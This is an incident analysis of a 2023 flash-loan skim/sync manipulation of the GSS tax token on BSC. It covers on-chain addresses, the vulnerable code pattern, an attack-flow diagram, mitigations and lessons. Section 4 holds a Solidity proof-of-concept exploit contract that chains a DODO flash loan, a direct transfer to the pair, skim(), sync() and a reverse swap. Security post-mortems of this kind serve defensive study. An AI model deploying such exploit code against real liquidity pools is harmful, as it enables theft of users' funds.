# GSS Flash Loan Skim/Sync Manipulation Incident Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | GSS Token |
| Date | 2023-08-28 |
| Chain | BSC (Binance Smart Chain) |
| Loss | ~$24,883 USD |
| Attack Type | Flash Loan + Skim/Sync Manipulation |
| CWE | CWE-682 (Incorrect Calculation) |
| Attacker Address | `0x84f37f6cc75ccde5fe9ba99093824a11cfdc329d` |
| Attack Contract | `0x69ed5b59d977695650ec4b29e61c0faa8cc0ed5c` |
| Vulnerable Contract | `0x37e42B961AE37883BAc2fC29207A5F88eFa5db66` (GSS Token) |
| Fork Block | 31,108,558 |

## 2. Vulnerability Code Analysis

The GSS token is a tax token that charges a fee on every transfer, and was vulnerable to interactions with the `skim()` and `sync()` functions of a Uniswap V2-style AMM. The attacker obtained a large amount of USDT via flash loan, purchased GSS, directly transferred GSS to the pair contract, extracted the surplus via `skim()`, and reset the reserves via `sync()` to profit from the price discrepancy.

```solidity
// Vulnerable pattern: tax token skim/sync vulnerability
contract GSSToken is ERC20 {
    uint256 public constant TAX_RATE = 300; // 3%
    address public pair;

    function _transfer(address from, address to, uint256 amount) internal override {
        uint256 tax = amount * TAX_RATE / 10000;
        // Tax is sent directly to the pair address
        super._transfer(from, pair, tax);
        super._transfer(from, to, amount - tax);
    }
}

// Vulnerable functions in Uniswap V2 Pair
contract UniswapV2Pair {
    // skim: transfers balance exceeding reserves to the specified address
    function skim(address to) external {
        address _token0 = token0;
        address _token1 = token1;
        _safeTransfer(_token0, to, IERC20(_token0).balanceOf(address(this)) - reserve0);
        _safeTransfer(_token1, to, IERC20(_token1).balanceOf(address(this)) - reserve1);
    }

    // sync: updates reserves to match current balances
    function sync() external {
        _update(IERC20(token0).balanceOf(address(this)),
                IERC20(token1).balanceOf(address(this)), reserve0, reserve1);
    }
}
```

**Vulnerability**: The transfer tax on the GSS token increases the pair contract's balance but does not update the reserves. This discrepancy can be extracted via `skim()`, and calling `sync()` resets the reserves to the manipulated balance, causing the GSS price to drop and creating an arbitrage opportunity to purchase more GSS.

### On-Chain Source Code

Source: Bytecode decompilation

```solidity
// Root cause: Flash Loan + Skim/Sync Manipulation
// Source code unverified — based on bytecode analysis
```

## 3. Attack Flow

```
Attacker [0x84f37f6cc75ccde5fe9ba99093824a11cfdc329d]
  │
  ├─1─▶ IDPPOracle.flashLoan() - DODO Flash Loan
  │      [DODO Pool: BSC USDT Pool]
  │      Borrow large amount of USDT
  │      [USDT: 0x55d398326f99059fF775485246999027B3197955]
  │
  ├─2─▶ swap(USDT → GSS)
  │      [GSS-USDT Pool: 0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0]
  │      Purchase GSS tokens → transfer tax increases pair balance
  │      [GSS: 0x37e42B961AE37883BAc2fC29207A5F88eFa5db66]
  │
  ├─3─▶ GSS.transfer(USDT-GSS Pool, amount)
  │      Directly transfer GSS to the pair
  │      → pair balance > reserves (discrepancy created)
  │
  ├─4─▶ GSS-USDT Pool.skim(address(this))
  │      Extract GSS surplus above reserves
  │
  ├─5─▶ GSS-USDT Pool.sync()
  │      Update reserves to current balances → GSS price manipulated
  │
  ├─6─▶ swap(GSS → USDT)
  │      Receive more USDT at the manipulated price
  │      [GSS-GSSDAO Pool: 0xB4F4cD1cc2DfF1A14c4Aaa9E9434A92082855C64]
  │
  └─7─▶ USDT.transfer(DODO) - Flash loan repayment
         ~$24,883 profit realized
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface IDPPOracle {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

interface IPancakePair {
    function skim(address to) external;
    function sync() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

contract GSSExploit {
    IDPPOracle dodoPool;
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 GSS = IERC20(0x37e42B961AE37883BAc2fC29207A5F88eFa5db66);
    IPancakePair gssUsdtPool = IPancakePair(0x1ad2cB3C2606E6D5e45c339d10f81600bdbf75C0);
    IPancakePair gssDaoPool = IPancakePair(0xB4F4cD1cc2DfF1A14c4Aaa9E9434A92082855C64);
    IUniswapV2Router router;

    function testExploit() external {
        dodoPool.flashLoan(0, USDT.balanceOf(address(dodoPool)) * 99/100, address(this), "gss");
    }

    function DPPFlashLoanCall(address, uint256, uint256 quoteAmount, bytes calldata) external {
        // Swap USDT → GSS
        USDT.approve(address(router), quoteAmount);
        address[] memory buyPath = new address[](2);
        buyPath[0] = address(USDT);
        buyPath[1] = address(GSS);
        router.swapExactTokensForTokens(quoteAmount, 0, buyPath, address(this), block.timestamp);

        // Directly transfer GSS to pair → create discrepancy between reserves and balance
        uint256 gssBalance = GSS.balanceOf(address(this));
        GSS.transfer(address(gssUsdtPool), gssBalance / 2);

        // Extract surplus via skim
        gssUsdtPool.skim(address(this));

        // Manipulate reserves via sync → GSS price shifts
        gssUsdtPool.sync();

        // Reverse swap GSS → USDT at manipulated price
        gssBalance = GSS.balanceOf(address(this));
        GSS.approve(address(router), gssBalance);
        address[] memory sellPath = new address[](2);
        sellPath[0] = address(GSS);
        sellPath[1] = address(USDT);
        router.swapExactTokensForTokens(gssBalance, 0, sellPath, address(this), block.timestamp);

        // Repay DODO flash loan
        USDT.transfer(address(dodoPool), quoteAmount);
    }
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-682 (Incorrect Calculation) |
| Vulnerability Type | Tax token + skim/sync AMM manipulation |
| Impact Scope | GSS-USDT and GSS-GSSDAO liquidity pools |
| Explorer | [BSCscan](https://bscscan.com/address/0x37e42B961AE37883BAc2fC29207A5F88eFa5db66) |

## 6. Security Recommendations

```solidity
// Fix 1: Prevent tax from being sent to the pair address
contract GSSToken is ERC20 {
    mapping(address => bool) public isAMM;

    function _transfer(address from, address to, uint256 amount) internal override {
        uint256 tax = amount * TAX_RATE / 10000;
        // Send tax to treasury instead of pair
        address taxRecipient = isAMM[from] || isAMM[to] ? treasury : address(0xdead);
        super._transfer(from, taxRecipient, tax);
        super._transfer(from, to, amount - tax);
    }
}

// Fix 2: Disable skim() in custom pair
function skim(address) external override {
    revert("skim disabled");
}

// Fix 3: Prevent buy and sell within the same block
mapping(address => uint256) public lastBuyBlock;

function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external override {
    address token0Addr = token0;
    if (amount0Out > 0) {
        lastBuyBlock[to] = block.number;
    }
    if (amount1Out > 0 && lastBuyBlock[to] == block.number) {
        revert("Same block buy-sell not allowed");
    }
    super.swap(amount0Out, amount1Out, to, data);
}
```

## 7. Lessons Learned

1. **Tax Tokens and AMM Vulnerabilities**: Tokens that charge a transfer tax are vulnerable to sustained arbitrage attacks when combined with the `skim()`/`sync()` functions of a Uniswap V2-style AMM.
2. **The skim/sync Combination Pattern**: Calling `sync()` after `skim()` decouples the pair's reserves from its actual balances, enabling price manipulation. This pattern recurs repeatedly in tax token attacks on BSC.
3. **Tax Recipient Design**: When a tax token's fee is sent directly to the pair address, that amount becomes extractable surplus via `skim()`. Taxes must be sent to a separate address such as a treasury.
4. **Recurring BSC Tax Token Pattern**: The tax token + skim/sync combination attack has been repeated across dozens of incidents on BSC, including ApeDAO, Bamboo, Utopia, and GSS. Understanding this pattern and implementing proactive defenses is essential.